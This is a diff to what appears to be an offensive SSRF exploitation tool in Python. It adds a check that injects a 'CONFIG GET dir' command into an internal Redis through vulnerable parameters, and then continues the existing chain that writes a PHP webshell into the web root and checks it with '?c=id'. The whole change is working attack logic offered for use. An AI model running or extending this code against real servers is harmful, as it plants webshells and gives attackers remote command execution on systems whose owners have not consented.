@@ -21,7 +21,7 @@ from urllib.parse import urlsplit
 from ...core.httpmsg import Request
 from ...core.mutate import Kind
 from ...core.params import Encode, rewrite
-from ...core.protocols import gopher_http
+from ...core.protocols import gopher_http, redis_command
 from ...engine.blackboard import Confidence
 from ...engine.inject import (
     candidates as _candidates,
@@ -569,12 +569,55 @@ def exploit_services(ctx: RunContext) -> None:
         _exploit_phpfpm(ctx)
 
 
+def _redis_exploitable(ctx: RunContext) -> str:
+    """Ask Redis the one question that decides whether any of this can work.
+
+    `CONFIG SET dir` is the hinge the whole write-a-file chain turns on, and on
+    Redis 7 and later `dir` and `dbfilename` are protected configs: the server
+    answers `-ERR ... can't set protected config` and none of the writes land.
+    Sending the full chain anyway costs a request per generation to learn
+    something a single read tells us first.
+
+    Returns the reason it cannot be done, or an empty string when it can. A
+    service that does not answer at all returns empty too: not knowing is not
+    the same as knowing it will fail, and the chain is still worth trying.
+    """
+    probe = redis_command("127.0.0.1", 6379, "CONFIG GET dir")
+    for param in _candidates(ctx):
+        if ctx.stopped:
+            return ""
+        outcome = _inject(ctx, param, probe, "exploit.redis-capability")
+        if outcome is None:
+            continue
+        _, exchange, _ = outcome
+        reply = exchange.response.text
+        if not reply or exchange.response.error:
+            return ""
+
+        refusal = _service_refusal(reply)
+        if refusal:
+            return refusal
+        if "dir" not in reply:
+            # A reply that does not carry the setting means the command did not
+            # reach a Redis that answers CONFIG GET at all.
+            return "CONFIG GET dir came back without the setting"
+        return ""
+    return ""
+
+
 def _exploit_redis(ctx: RunContext, base: str) -> None:
     webroot = ctx.config.get("webroot")
     shell_name = ctx.config.get("shell_name") or DEFAULT_SHELL_NAME
     if not webroot:
         ctx.info("  redis answers; pass --webroot to write a file through its persistence path")
         return
+
+    unable = _redis_exploitable(ctx)
+    if unable:
+        ctx.emit(f"  [-] redis: a file cannot be written through it here ({unable})")
+        ctx.blackboard.mark_dead_end("exploit.redis-webshell", f"redis refused: {unable}")
+        return
+
     payload = redis_write_file("127.0.0.1", 6379, webroot, shell_name, php_webshell())
     _send_exploit(ctx, payload, "redis-webshell", verify_url=f"{base}/{shell_name}?c=id")
 
